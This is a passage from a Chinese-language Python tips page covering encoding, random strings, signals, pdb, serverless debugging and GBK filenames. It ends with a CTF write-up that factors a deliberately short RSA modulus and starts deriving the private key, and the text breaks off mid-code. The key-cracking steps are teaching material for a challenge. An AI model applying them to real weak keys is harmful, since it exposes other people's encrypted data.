<div class="codehilite"><pre><span></span><code><span class="nb">export</span> <span class="nv">PYTHONIOENCODING</span><span class="o">=</span>utf8
</code></pre></div>


<p>方法2：强制修改stdout</p>
<div class="codehilite"><pre><span></span><code><span class="kn">import</span> <span class="nn">sys</span>
<span class="n">sys</span><span class="o">.</span><span class="n">stdout</span><span class="o">=</span><span class="nb">open</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="s1">&#39;w&#39;</span><span class="p">,</span> <span class="n">encoding</span><span class="o">=</span><span class="s1">&#39;utf-8&#39;</span><span class="p">,</span> <span class="n">closefd</span><span class="o">=</span><span class="bp">False</span><span class="p">)</span>
</code></pre></div>


<hr />
<h2 id="pep8">遵循PEP8检查你的代码<a class="headerlink" href="#pep8" title="Permanent link">&para;</a></h2>
<p><a href="https://github.com/PyCQA/pycodestyle">pycodestyle</a></p>
<p>安装并使用pycodestyle检查代码，忽略E501一行不能长于80个字符的限制：</p>
<div class="codehilite"><pre><span></span><code><span class="err">pip install pycodestyle</span>
<span class="err">pycodestyle --show-source --ignore=E501 yourcode.py</span>
</code></pre></div>


<hr />
<h2 id="_2">生成随机字符串<a class="headerlink" href="#_2" title="Permanent link">&para;</a></h2>
<div class="codehilite"><pre><span></span><code><span class="kn">import</span> <span class="nn">random</span>
<span class="kn">import</span> <span class="nn">string</span>
<span class="k">def</span> <span class="nf">random_str</span><span class="p">(</span><span class="n">length</span><span class="o">=</span><span class="mi">8</span><span class="p">):</span>
    <span class="k">return</span> <span class="s2">&quot;&quot;</span><span class="o">.</span><span class="n">join</span><span class="p">(</span><span class="n">random</span><span class="o">.</span><span class="n">sample</span><span class="p">(</span><span class="n">string</span><span class="o">.</span><span class="n">ascii_letters</span><span class="p">,</span> <span class="n">length</span><span class="p">))</span>
</code></pre></div>


<div class="codehilite"><pre><span></span><code><span class="kn">from</span> <span class="nn">random</span> <span class="kn">import</span> <span class="n">Random</span>
<span class="k">def</span> <span class="nf">random_str</span><span class="p">(</span><span class="n">randomlength</span><span class="o">=</span><span class="mi">8</span><span class="p">):</span>
    <span class="nb">str</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
    <span class="n">chars</span> <span class="o">=</span> <span class="s1">&#39;AaBbCcDdEeFfGgHhIiJjKkLlMmNnOoPpQqRrSsTtUuVvWwXxYyZz0123456789&#39;</span>
    <span class="n">length</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">chars</span><span class="p">)</span> <span class="o">-</span> <span class="mi">1</span>
    <span class="n">random</span> <span class="o">=</span> <span class="n">Random</span><span class="p">()</span>
    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="n">randomlength</span><span class="p">):</span>
        <span class="nb">str</span><span class="o">+=</span><span class="n">chars</span><span class="p">[</span><span class="n">random</span><span class="o">.</span><span class="n">randint</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="n">length</span><span class="p">)]</span>
    <span class="k">return</span> <span class="nb">str</span>
</code></pre></div>


<hr />
<h2 id="python_2">Python解方程<a class="headerlink" href="#python_2" title="Permanent link">&para;</a></h2>
<p>需要 <code>pip install sympy</code></p>
<div class="codehilite"><pre><span></span><code><span class="kn">from</span> <span class="nn">sympy</span> <span class="kn">import</span> <span class="o">*</span>
<span class="c1"># 解一元方程：</span>
<span class="c1">#   2x^2-18=0</span>
<span class="n">x</span><span class="o">=</span><span class="n">Symbol</span><span class="p">(</span><span class="s1">&#39;x&#39;</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="n">solve</span><span class="p">(</span><span class="mi">2</span><span class="o">*</span><span class="n">x</span><span class="o">**</span><span class="mi">2</span><span class="o">-</span><span class="mi">18</span><span class="p">,</span><span class="n">x</span><span class="p">))</span>
<span class="c1"># 得到[-3,3]</span>

<span class="c1"># 解方程组</span>
<span class="c1">#   y=1-x</span>
<span class="c1">#   3x+2y-5</span>
<span class="n">x</span><span class="p">,</span><span class="n">y</span><span class="o">=</span><span class="n">symbols</span><span class="p">(</span><span class="s1">&#39;x y&#39;</span><span class="p">)</span>
<span class="k">print</span><span class="p">(</span><span class="n">solve</span><span class="p">([</span> <span class="n">y</span><span class="o">-</span><span class="mi">1</span><span class="o">+</span><span class="n">x</span><span class="p">,</span> <span class="mi">3</span><span class="o">*</span><span class="n">x</span><span class="o">+</span><span class="mi">2</span><span class="o">*</span><span class="n">y</span><span class="o">-</span><span class="mi">5</span> <span class="p">],</span> <span class="p">[</span> <span class="n">x</span> <span class="p">,</span> <span class="n">y</span> <span class="p">]))</span>
<span class="c1"># 得到{x: 3, y: -2}</span>
</code></pre></div>


<hr />
<h2 id="in">大数据判断in<a class="headerlink" href="#in" title="Permanent link">&para;</a></h2>
<p>一定要用set，因为set的in操作是O(1)的，用list是O(n)速度太慢</p>
<hr />
<h2 id="pythonh-no-such-file-or-directory">解决Python.h: No such file or directory<a class="headerlink" href="#pythonh-no-such-file-or-directory" title="Permanent link">&para;</a></h2>
<div class="codehilite"><pre><span></span><code><span class="err">apt-get install -y python-dev python3-dev</span>
</code></pre></div>


<p>如果为CentOS系统：</p>
<div class="codehilite"><pre><span></span><code><span class="err">yum install python-devel</span>
</code></pre></div>


<hr />
<h2 id="_3">二进制字符串转普通字符串<a class="headerlink" href="#_3" title="Permanent link">&para;</a></h2>
<p>方法一：将字符串每8个分成一组，用int转10进制，再用chr转为ascii字符</p>
<div class="codehilite"><pre><span></span><code><span class="err">s=&quot;0110001101111001&quot;</span>
<span class="err">ans=&quot;&quot;</span>
<span class="err">for i in range(0,len(s)//8):</span>
<span class="err">    x = s[i*8:i*8+8]</span>
<span class="err">    ans+=chr(int(x,2))</span>
</code></pre></div>


<p>方法二：利用binascii，先用int转为10进制，然后转为16进制字符串，调用unhexlify执行翻译</p>
<div class="codehilite"><pre><span></span><code><span class="kn">import</span> <span class="nn">binascii</span>
<span class="n">s</span><span class="o">=</span><span class="s2">&quot;0110001101111001&quot;</span>
<span class="n">ans</span><span class="o">=</span><span class="n">binascii</span><span class="o">.</span><span class="n">unhexlify</span><span class="p">(</span><span class="s1">&#39;</span><span class="si">%x</span><span class="s1">&#39;</span><span class="o">%</span><span class="nb">int</span><span class="p">(</span><span class="n">s</span><span class="p">,</span><span class="mi">2</span><span class="p">))</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span>
</code></pre></div>


<p>补充：相应的如果要把十进制转为二进制，可以用bin(123)[2:]</p>
<hr />
<h2 id="bytes">十六进制字符串转bytes字符串<a class="headerlink" href="#bytes" title="Permanent link">&para;</a></h2>
<div class="codehilite"><pre><span></span><code><span class="kn">from</span> <span class="nn">base64</span> <span class="kn">import</span> <span class="n">b16encode</span><span class="p">,</span><span class="n">b16decode</span>
<span class="k">print</span><span class="p">(</span> <span class="n">b16encode</span><span class="p">(</span><span class="sa">b</span><span class="s1">&#39;py3.io&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">decode</span><span class="p">()</span> <span class="p">)</span> <span class="c1">#output: 7079332E696F</span>
<span class="k">print</span><span class="p">(</span> <span class="n">b16decode</span><span class="p">(</span><span class="s2">&quot;7079332E696F&quot;</span><span class="o">.</span><span class="n">upper</span><span class="p">())</span> <span class="p">)</span> <span class="c1">#output: b&#39;py3.io&#39;, 这里使用upper转大写</span>
</code></pre></div>


<p>相应的，拿到一个十进制数，转字符串：</p>
<div class="codehilite"><pre><span></span><code><span class="err">key = 5287002131074331513</span>
<span class="err">print( b16decode( hex(key)[2:].upper() ) )#output: b&#39;I_4m-k3y&#39;</span>
</code></pre></div>


<hr />
<h2 id="python3pat">用Python3写PAT心得<a class="headerlink" href="#python3pat" title="Permanent link">&para;</a></h2>
<ul>
<li>
<p>如果发生格式错误，检查输出的最后一行的print，加上end=&rdquo;&ldquo;表示不要换行</p>
</li>
<li>
<p>如果数据规模大导致超时，代码中的in操作前先把list转为set，能大幅度提速</p>
</li>
</ul>
<hr />
<h2 id="requestspost">用requests进行post<a class="headerlink" href="#requestspost" title="Permanent link">&para;</a></h2>
<p>需要注意加上这两个参数：</p>
<div class="codehilite"><pre><span></span><code><span class="err">,allow_redirects=False,headers={&quot;Content-Type&quot;: &quot;application/x-www-form-urlencoded&quot;}</span>
</code></pre></div>


<p>登录请求的时候是要根据返回的headers里面Location有没有对不对来判断登录是否成功的，而requests默认会跟随301/302跳转，导致无法获取到跳转请求的headers，所以加上<code>allow_redirects=False</code></p>
<p>另外就是post数据的时候必须给出正确的Content-Type，否则服务器不认这个post的</p>
<p>再者就是可能对方有反爬虫措施，加上Referer和User-Agent就好咯</p>
<p>如果需要提交的是json的数据，记得post的data的单双引号要正确，应该用json.dumps的结果去post</p>
<p>如果要做爬虫，欢迎使用我的<a href="https://github.com/zjuchenyuan/EasyLogin">EasyLogin</a>，无需再操心这些细节，专注于核心爬虫代码</p>
<hr />
<h2 id="tkinter">通过tkinter获取、修改剪贴板<a class="headerlink" href="#tkinter" title="Permanent link">&para;</a></h2>
<p>支持py2和py3，Learned from https://www.daniweb.com/programming/software-development/code/487653/access-the-clipboard-via-tkinter</p>
<div class="codehilite"><pre><span></span><code><span class="k">try</span><span class="p">:</span>
    <span class="kn">from</span> <span class="nn">tkinter</span> <span class="kn">import</span> <span class="n">Tk</span>
<span class="k">except</span> <span class="ne">ImportError</span><span class="p">:</span>
    <span class="kn">from</span> <span class="nn">Tkinter</span> <span class="kn">import</span> <span class="n">Tk</span>
<span class="n">root</span> <span class="o">=</span> <span class="n">Tk</span><span class="p">()</span>
<span class="n">root</span><span class="o">.</span><span class="n">withdraw</span><span class="p">()</span> <span class="c1">#隐藏Tk的窗口</span>
<span class="n">text</span> <span class="o">=</span> <span class="s2">&quot;Donnerwetter&quot;</span>
<span class="c1"># 清空剪贴板 clear clipboard</span>
<span class="n">root</span><span class="o">.</span><span class="n">clipboard_clear</span><span class="p">()</span>
<span class="c1"># 写入剪贴板 write text to clipboard</span>
<span class="n">root</span><span class="o">.</span><span class="n">clipboard_append</span><span class="p">(</span><span class="n">text</span><span class="p">)</span>
<span class="c1"># 读取剪贴板 text from clipboard</span>
<span class="n">clip_text</span> <span class="o">=</span> <span class="n">root</span><span class="o">.</span><span class="n">clipboard_get</span><span class="p">()</span>
<span class="k">print</span><span class="p">(</span><span class="n">clip_text</span><span class="p">)</span>  <span class="c1"># --&gt; Donnerwetter</span>
</code></pre></div>


<hr />
<h2 id="_4">符号数与无符号数转换<a class="headerlink" href="#_4" title="Permanent link">&para;</a></h2>
<h3 id="_5">无符号→有符号，为了加上负号：<a class="headerlink" href="#_5" title="Permanent link">&para;</a></h3>
<div class="codehilite"><pre><span></span><code><span class="kn">import</span> <span class="nn">ctypes</span>
<span class="n">ctypes</span><span class="o">.</span><span class="n">c_int64</span><span class="p">(</span><span class="mi">17039472050328044269</span><span class="p">)</span><span class="o">.</span><span class="n">value</span>
</code></pre></div>


<p>上述将得到-1407272023381507347</p>
<h3 id="_6">有符号→无符号，为了去掉负号：<a class="headerlink" href="#_6" title="Permanent link">&para;</a></h3>
<div class="codehilite"><pre><span></span><code><span class="kn">import</span> <span class="nn">ctypes</span>
<span class="n">ctypes</span><span class="o">.</span><span class="n">c_uint64</span><span class="p">(</span><span class="o">-</span><span class="mi">1407272023381507347</span><span class="p">)</span><span class="o">.</span><span class="n">value</span>
</code></pre></div>


<p>上述将得到17039472050328044269</p>
<hr />
<h2 id="signalsigalrm-only-linux">使用signal.SIGALRM在限定时间后退出进程 (only Linux)<a class="headerlink" href="#signalsigalrm-only-linux" title="Permanent link">&para;</a></h2>
<p>在设计CTF的题目的时候，有必要限制用户的连接时间，这时候简单方案就是用SIGALRM信号咯</p>
<div class="codehilite"><pre><span></span><code><span class="k">def</span> <span class="nf">clock</span><span class="p">(</span><span class="n">timeout</span><span class="o">=</span><span class="mi">5</span><span class="p">):</span>
    <span class="kn">import</span> <span class="nn">signal</span>
    <span class="k">def</span> <span class="nf">signal_handler</span><span class="p">(</span><span class="n">signum</span><span class="p">,</span><span class="n">data</span><span class="p">):</span>
        <span class="k">if</span> <span class="n">signum</span> <span class="o">==</span> <span class="n">signal</span><span class="o">.</span><span class="n">SIGALRM</span><span class="p">:</span>
            <span class="k">print</span><span class="p">(</span><span class="s2">&quot;Time is up!&quot;</span><span class="p">)</span>
            <span class="nb">exit</span><span class="p">()</span>
    <span class="n">signal</span><span class="o">.</span><span class="n">signal</span><span class="p">(</span><span class="n">signal</span><span class="o">.</span><span class="n">SIGALRM</span><span class="p">,</span> <span class="n">signal_handler</span><span class="p">)</span>
    <span class="n">signal</span><span class="o">.</span><span class="n">alarm</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">timeout</span><span class="p">))</span>
</code></pre></div>


<hr />
<h2 id="ctrlc">捕捉用户的Ctrl+C<a class="headerlink" href="#ctrlc" title="Permanent link">&para;</a></h2>
<p>特殊情况下我们想屏蔽掉Ctrl+C，这时候写个自己的函数处理SIGALRM信号就好啦</p>
<div class="codehilite"><pre><span></span><code><span class="kn">import</span> <span class="nn">signal</span>

<span class="k">def</span> <span class="nf">signal_handler</span><span class="p">(</span><span class="n">signum</span><span class="p">,</span><span class="n">data</span><span class="p">):</span>
    <span class="k">if</span> <span class="n">signum</span> <span class="o">==</span> <span class="n">signal</span><span class="o">.</span><span class="n">SIGINT</span><span class="p">:</span>
        <span class="k">print</span><span class="p">(</span><span class="s2">&quot;Ctrl+C is pressed!&quot;</span><span class="p">)</span>
        <span class="c1">#raise KeyboardInterrupt</span>

<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
    <span class="n">signal</span><span class="o">.</span><span class="n">signal</span><span class="p">(</span><span class="n">signal</span><span class="o">.</span><span class="n">SIGINT</span><span class="p">,</span> <span class="n">signal_handler</span><span class="p">)</span>
    <span class="n">sleep</span><span class="p">(</span><span class="mi">666</span><span class="p">)</span>
</code></pre></div>


<hr />
<h2 id="signalsigalrm-only-linux_1">使用signal.SIGALRM实现定时器 (only Linux)<a class="headerlink" href="#signalsigalrm-only-linux_1" title="Permanent link">&para;</a></h2>
<p>实现一个类似Javascript的setInterval功能</p>
<div class="codehilite"><pre><span></span><code><span class="kn">import</span> <span class="nn">signal</span>
<span class="kn">from</span> <span class="nn">time</span> <span class="kn">import</span> <span class="n">sleep</span>
<span class="n">INTERVAL</span><span class="o">=</span><span class="mi">1</span>
<span class="n">COUNT</span><span class="o">=</span><span class="mi">0</span>
<span class="k">def</span> <span class="nf">signal_handler</span><span class="p">(</span><span class="n">signum</span><span class="p">,</span><span class="n">data</span><span class="p">):</span>
    <span class="k">global</span> <span class="n">COUNT</span>
    <span class="k">if</span> <span class="n">signum</span> <span class="o">==</span> <span class="n">signal</span><span class="o">.</span><span class="n">SIGALRM</span><span class="p">:</span>
        <span class="c1"># 你的定时器代码写在这里 Your function here</span>
        <span class="k">print</span><span class="p">(</span><span class="s2">&quot;Count! {}&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">COUNT</span><span class="p">))</span>
        <span class="n">COUNT</span><span class="o">+=</span><span class="mi">1</span>
        <span class="n">signal</span><span class="o">.</span><span class="n">alarm</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">INTERVAL</span><span class="p">))</span> <span class="c1">#再设置一个clock就能循环往复咯</span>

<span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
    <span class="n">signal</span><span class="o">.</span><span class="n">signal</span><span class="p">(</span><span class="n">signal</span><span class="o">.</span><span class="n">SIGALRM</span><span class="p">,</span> <span class="n">signal_handler</span><span class="p">)</span>
    <span class="n">signal</span><span class="o">.</span><span class="n">alarm</span><span class="p">(</span><span class="nb">int</span><span class="p">(</span><span class="n">INTERVAL</span><span class="p">))</span>
    <span class="n">sleep</span><span class="p">(</span><span class="mi">23333</span><span class="p">)</span>
</code></pre></div>


<hr />
<h2 id="pdb">使用pdb进行调试<a class="headerlink" href="#pdb" title="Permanent link">&para;</a></h2>
<p>在需要调试的文件头部加入</p>
<div class="codehilite"><pre><span></span><code><span class="kn">import</span> <span class="nn">pdb</span>
</code></pre></div>


<p>需要停下来的地方加入</p>
<div class="codehilite"><pre><span></span><code><span class="err">pdb.set_trace()</span>
</code></pre></div>


<p>Tutorial: <a href="https://github.com/spiside/pdb-tutorial">https://github.com/spiside/pdb-tutorial</a></p>
<hr />
<h2 id="pythonserverlessfunction-as-service">使用Python开发Serverless(Function as Service)后端服务<a class="headerlink" href="#pythonserverlessfunction-as-service" title="Permanent link">&para;</a></h2>
<p><a href="https://github.com/zjuchenyuan/zju-jwb-to-icalendar">项目地址 &amp; 部署过程</a></p>
<p>如果您只是需要部署一个Example，↑↑↑(顺手求个Star)；如果您对这个代码是如何写出来的和踩坑过程感兴趣，继续看吧：</p>
<h3 id="_7">踩过的坑与解决过程(论阿里云是怎么把人气死的)<a class="headerlink" href="#_7" title="Permanent link">&para;</a></h3>
<h4 id="1api">1.API网关与函数计算的对接<a class="headerlink" href="#1api" title="Permanent link">&para;</a></h4>
<p>按照<a href="https://help.aliyun.com/document_detail/54788.html">教程</a>，当时不够耐心，拿着hello world的程序（不要信教程中的2.1部分的截图）就在使用API网关，结果总是返回503</p>
<p>耐心下来看文档把程序改为后面的撞墙式程序就好了，人家其实说了函数计算应该返回的数据结构，不按照这个结构来就会503：</p>
<div class="codehilite"><pre><span></span><code><span class="err">{</span>
<span class="err">    &quot;isBase64Encoded&quot;: True或者False,</span>
<span class="err">    &quot;statusCode&quot;: 200, #可以为302来实现跳转</span>
<span class="err">    &quot;headers&quot;: {...} #返回的response headers，但其中的Content-Type没有作用</span>
<span class="err">    &quot;body&quot;: &quot;...&quot; #返回的网页正文内容</span>
<span class="err">}</span>
</code></pre></div>


<h4 id="2api">2.修改API网关参数定义后要再次发布<a class="headerlink" href="#2api" title="Permanent link">&para;</a></h4>
<p>无论有没有改Mock设置，只要改动了设置都需要重新发布，发布线上版本即可</p>
<h4 id="3windowsfclifcliexe">3.不能使用Windows版本的fcli工具(fcli.exe)<a class="headerlink" href="#3windowsfclifcliexe" title="Permanent link">&para;</a></h4>
<p>人家已经发布了新版本的fcli解决了此问题</p>
<p>这个bug简直了，整个流程如下：</p>
<p>按照文档说明一路部署上传都没有问题，调用函数的时候却说<code>Unable to import module 'index'</code></p>
<p>然后我就在Linux服务器上<code>docker pull python:2.7</code>然后<code>docker run -it --rm -v /root/ical:/code</code> python:2.7 /bin/bash<code>，进入bash后</code>cd /code; python<code>，进入python后</code>import index`</p>
<p>啊哈，发现是<code>ImportError: No module named 'bs4'</code>，自己的锅，用<code>pip install bs4 -t .</code>一个个解决依赖包后，在docker容器中总算是能够跑起来了，且能正常返回了</p>
<p>然后用<code>fcli.exe shell</code>的<code>mkf</code>再上传一次，调用函数还是老样子<code>Unable to import module 'index'</code>，令人很抓狂。。。</p>
<p>突然想到不能被import应该是全局的import失败了，多次折腾后，把<code>from grabber import grabber</code>移动到index函数中，总算得到了明确的报错：还是<code>ImportError: No module named 'bs4'</code>；哈？这是什么鬼，明明我都把bs4文件夹放到代码目录下了，为啥还是报错？</p>
<p>既然他说import失败，会不会是Python搜索包的PATH的问题，于是Google到了把当前文件所在的目录加入搜索的方法：</p>
<div class="codehilite"><pre><span></span><code><span class="err">sys.path.append(os.path.dirname(os.path.abspath(__file__)))</span>
</code></pre></div>


<p>Orz, 还是没有用。。。</p>
<p>想到既然部署后代码文件夹<code>/code</code>没有我需要的依赖包，那<code>/code</code>文件夹里面到底有啥呢？果断fuck一下，在index函数开头写上:</p>
<div class="codehilite"><pre><span></span><code><span class="k">def</span> <span class="nf">index</span><span class="p">():</span>
    <span class="k">return</span> <span class="p">{</span><span class="s2">&quot;fuck&quot;</span><span class="p">:</span> <span class="nb">list</span><span class="p">(</span><span class="n">os</span><span class="o">.</span><span class="n">listdir</span><span class="p">(</span><span class="s2">&quot;/code&quot;</span><span class="p">))}</span>
    <span class="kn">import</span> <span class="nn">bs4</span> <span class="c1">#会出错的import</span>
    <span class="o">...</span><span class="c1">#正常代码</span>
</code></pre></div>


<p>总算调用成功了，然后一看输出结果，woc! (内心中骂了多次mdzz阿里云</p>
<p>给张截图：</p>
<p><img alt="" src="../assets/img/fuckaliyun.jpg" /></p>
<p>os.listdir应该返回的是当前这个文件夹下含有的文件名称和文件夹名称，而现在我们看到的是含有<code>\\</code>很像路径名的东西，说明这个fcli.exe把windows的<code>\\</code>路径名当成了文件名的一部分，部署后在/code文件夹下也就对应创建了名称为<code>bs4\\__init__.py</code>这样的文件(根本没有bs4子文件夹)，Python当然会找不到bs4这个包啊！摔！</p>
<p>改用人家fcli的Linux 64bit版本，问题解决。。。</p>
<p>总结一下，万万想不到Windows版本的工具(针对0.5版本)会把路径分隔符<code>\\</code>当成文件名一部分来看待，真是大开眼界</p>
<hr />
<h2 id="linuxgbk">修复Linux下gbk编码的文件名<a class="headerlink" href="#linuxgbk" title="Permanent link">&para;</a></h2>
<p>代码见<a href="../code/fixgbknames.py">code/fixgbknames.py</a></p>
<p>在特殊情况下，Linux中可能会有gbk编码的文件名，这种文件用<code>ls</code>查看都是乱码，难以操作</p>
<p>如何修复这些<code>错误</code>的文件名呢？用到<code>python3</code>提供的os.walk(b&rdquo;.&rdquo;)就能得到bytes类型的文件名，然后<code>os.system</code>调用bytes类型的<code>mv</code>命令行就好啦~</p>
<hr />
<h2 id="crack-rsa">Crack RSA!<a class="headerlink" href="#crack-rsa" title="Permanent link">&para;</a></h2>
<h3 id="_8">题目信息<a class="headerlink" href="#_8" title="Permanent link">&para;</a></h3>
<p>题目来源：<a href="https://docs.google.com/forms/d/e/1FAIpQLSfOI5AgEvlqa6-nRLAZI8Dvs6_XmZDHSog2pKteS5rvp3AU0Q/viewform">清华蓝莲花战队纳新表（需自备梯子）</a></p>
<p>密码学 (Cryptography)</p>
<p>RSA算法的原理以及破解，请下载<a href="https://d.py3.io/rsa.zip">这个文件</a>，解密其中的flag.enc文件。</p>
<h3 id="rsa">RSA是啥<a class="headerlink" href="#rsa" title="Permanent link">&para;</a></h3>
<p>略&hellip;(连这个都不知道还不去google，你适不适合CTF心里一点B数都没有吗)</p>
<p>符号约定： n一个大数， p和q是它的质因子，d私钥，m信息明文，c信息密文</p>
<h3 id="_9">破解的数学原理<a class="headerlink" href="#_9" title="Permanent link">&para;</a></h3>
<p>参考：https://stackoverflow.com/questions/4078902/cracking-short-rsa-keys</p>
<p>Google搜索关键词 crack rsa key</p>
<p>给定公钥n和e，假定我们成功分解n = p * q，那么求出d</p>
<div class="codehilite"><pre><span></span><code><span class="err">d = e^-1 mod phi(n)</span>
<span class="err">  = e^-1 mod (p-1)*(q-1)</span>
</code></pre></div>


<p>现在我们有了私钥d，可以对密文c解密得到明文m：</p>
<div class="codehilite"><pre><span></span><code><span class="err">m = c^d (mod n)</span>
</code></pre></div>


<h3 id="_10">实现它<a class="headerlink" href="#_10" title="Permanent link">&para;</a></h3>
<h4 id="ne">题目给的公钥是啥格式，怎么读取出N和e?<a class="headerlink" href="#ne" title="Permanent link">&para;</a></h4>
<p>题目给的公钥是这样的：</p>
<div class="codehilite"><pre><span></span><code><span class="err">-----BEGIN PUBLIC KEY-----</span>
<span class="err">MDwwDQYJKoZIhvcNAQEBBQADKwAwKAIhAMgVHv67DCP6oRAiQJxaEuSluWmE5iZb</span>
<span class="err">e+fuqvuwBPUfAgMBAAE=</span>
<span class="err">-----END PUBLIC KEY-----</span>
</code></pre></div>


<p>看起来很短，估计是可以分解的比较小的N</p>
<p>google搜索关键词：openssl get n from public key</p>
<p>参考：https://stackoverflow.com/questions/3116907/rsa-get-exponent-and-modulus-given-a-public-key</p>
<p>人家给出了这样的做法：(环境Linux，已经安装openssl)</p>
<div class="codehilite"><pre><span></span><code><span class="err"># 丢弃头尾的---行，提取公钥内容并合并一行（这是base64编码的字符串）</span>
<span class="err">PUBKEY=`grep -v -- ----- public.pem | tr -d &#39;\n&#39;`</span>
<span class="err"># 编码格式是asn1，查看这种编码的格式</span>
<span class="err">echo $PUBKEY | base64 -d | openssl asn1parse -inform DER -i</span>
</code></pre></div>


<p>将输出：</p>
<div class="codehilite"><pre><span></span><code><span class="err">    0:d=0  hl=2 l=  60 cons: SEQUENCE</span>
<span class="err">    2:d=1  hl=2 l=  13 cons:  SEQUENCE</span>
<span class="err">    4:d=2  hl=2 l=   9 prim:   OBJECT            :rsaEncryption</span>
<span class="err">   15:d=2  hl=2 l=   0 prim:   NULL</span>
<span class="err">   17:d=1  hl=2 l=  43 prim:  BIT STRING</span>
</code></pre></div>


<p>最后一行BIT STRING就是数据所在的位置，偏移为17</p>
<p>提取出来：</p>
<div class="codehilite"><pre><span></span><code><span class="err">echo $PUBKEY | base64 -d | openssl asn1parse -inform DER -i -strparse 17</span>
</code></pre></div>


<p>得到：</p>
<div class="codehilite"><pre><span></span><code><span class="err">    0:d=0  hl=2 l=  40 cons: SEQUENCE</span>
<span class="err">    2:d=1  hl=2 l=  33 prim:  INTEGER           :C8151EFEBB0C23FAA11022409C5A12E4A5B96984E6265B7BE7EEAAFBB004F51F</span>
<span class="err">   37:d=1  hl=2 l=   3 prim:  INTEGER           :010001</span>
</code></pre></div>


<p>嗯~这样就看到十六进制的n和e啦，转为十进制的话python里面直接输入:</p>
<div class="codehilite"><pre><span></span><code><span class="err">n = 0xC8151EFEBB0C23FAA11022409C5A12E4A5B96984E6265B7BE7EEAAFBB004F51F</span>
<span class="err">print(n) </span>
</code></pre></div>


<p>上述python执行后将输出</p>
<p>90499887424928873790510606439768063703452393541528122252967476339871041516831</p>
<p>同理我们得知e=65537，一般RSA加密都会把公钥的e选为65537</p>
<h4 id="n-pq">怎么分解n 得到p和q？<a class="headerlink" href="#n-pq" title="Permanent link">&para;</a></h4>
<p>你可以自己写代码，然而我懒，直接查数据库：</p>
<p>打开factordb.com这个神奇的网站，输入n的值就能查到分解结果啦：</p>
<p>http://factordb.com/index.php?query=90499887424928873790510606439768063703452393541528122252967476339871041516831</p>
<p>分解结果：</p>
<div class="codehilite"><pre><span></span><code><span class="err">9049988742...31&lt;77&gt; = 283194537446483890135816972554288437117&lt;39&gt; · 319567913424286672035093410391626922443&lt;39&gt;</span>
</code></pre></div>


<p>好了，我们就知道 p q了，具体哪个是p哪个是q并不重要</p>
<p>p=283194537446483890135816972554288437117, q=319567913424286672035093410391626922443</p>
<h4 id="d">怎么计算私钥d<a class="headerlink" href="#d" title="Permanent link">&para;</a></h4>
<p>根据RSA原理， d = e^-1 mod (p-1)*(q-1)， 现在我们有了p和q，mod后面的(p-1)*(q-1)自然是可以求出来的</p>
<p>但e^-1是个啥玩意？倒数？ 倒数还能求模？</p>
<p>emmm 其实是求逆元啦 然而不会写代码怎么办，当时是继续google啊</p>
<p>google关键词： python calculate inverse mod</p>
<p>参考：https://stackoverflow.com/questions/4798654/modular-multiplicative-inverse-function-in-python</p>
<p>得到代码：</p>
<div class="codehilite"><pre><span></span><code><span class="n">def</span> <span class="n">egcd</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">b</span><span class="p">):</span>
    <span class="k">if</span> <span class="n">a</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
        <span class="k">return</span> <span class="p">(</span><span class="n">b</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="k">g</span><span class="p">,</span> <span class="n">y</span><span class="p">,</span> <span class="n">x</span> <span class="o">=</span> <span class="n">egcd</span><span class="p">(</span><span class="n">b</span> <span class="o">%</span> <span class="n">a</span><span class="p">,</span> <span class="n">a</span><span class="p">)</span>
        <span class="k">return</span> <span class="p">(</span><span class="k">g</span><span class="p">,</span> <span class="n">x</span> <span class="o">-</span> <span class="p">(</span><span class="n">b</span> <span class="o">//</span> <span class="n">a</span><span class="p">)</span> <span class="o">*</span> <span class="n">y</span><span class="p">,</span> <span class="n">y</span><span class="p">)</span>

<span class="n">def</span> <span class="n">modinv</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">m</span><span class="p">):</span>
    <span class="k">g</span><span class="p">,</span> <span class="n">x</span><span class="p">,</span> <span class="n">y</span> <span class="o">=</span> <span class="n">egcd</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">m</span><span class="p">)</span>
    <span class="k">if</span> <span class="k">g</span> <span class="o">!=</span> <span class="mi">1</span><span class="p">:</span>
        <span class="n">raise</span> <span class="k">Exception</span><span class="p">(</span><span class="s1">&#39;modular inverse does not exist&#39;</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="k">return</span> <span class="n">x</span> <span class="o">%</span> <span class="n">m</span>
</code></pre></div>


<p>看不懂这代码在干啥？我也看不懂，但没关系，直接用就行 这么多人点赞肯定是对的</p>
<p>那现在就着手把这代码搬运到我们的py中咯：</p>
<div class="codehilite"><pre><span></span><code><span class="n">N</span> <span class="o">=</span> <span class="mi">0</span><span class="n">xC8151EFEBB0C23FAA11022409C5A12E4A5B96984E6265B7BE7EEAAFBB004F51F</span>
<span class="n">e</span> <span class="o">=</span> <span class="mi">0</span><span class="n">x10001</span>

<span class="n">p</span> <span class="o">=</span> <span class="mi">283194537446483890135816972554288437117</span>
<span class="n">q</span> <span class="o">=</span> <span class="mi">319567913424286672035093410391626922443</span>

<span class="n">def</span> <span class="n">egcd</span><span class="p">(</span><span class="n">a</span><span class="p">,</span> <span class="n">b</span><span class="p">):</span>
    <span class="k">if</span> <span class="n">a</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
